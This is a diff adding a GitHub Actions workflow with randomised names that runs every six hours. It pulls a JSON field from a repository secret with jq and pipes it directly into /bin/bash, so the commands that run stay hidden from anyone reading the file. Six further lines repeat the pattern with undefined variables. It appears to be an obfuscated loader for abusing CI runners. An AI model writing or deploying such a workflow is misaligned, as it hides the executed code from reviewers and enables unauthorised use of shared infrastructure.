@@ -1,0 +1,23 @@
+name: xujueli6715
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xujueli6715
+        env:
+          e46045: ${{ secrets.e46045 }}
+        run: |
+          echo $e46045 | jq -r .vh9 | /bin/bash
+          echo $hrk1 | jq -r .w664 | /bin/bash
+          echo $gqx0817 | jq -r .zv5568 | /bin/bash
+          echo $i4407 | jq -r .yh604 | /bin/bash
+          echo $dy5 | jq -r .e4 | /bin/bash
+          echo $hg99915 | jq -r .x86833 | /bin/bash
+          echo $d9 | jq -r .ysdun3 | /bin/bash
+
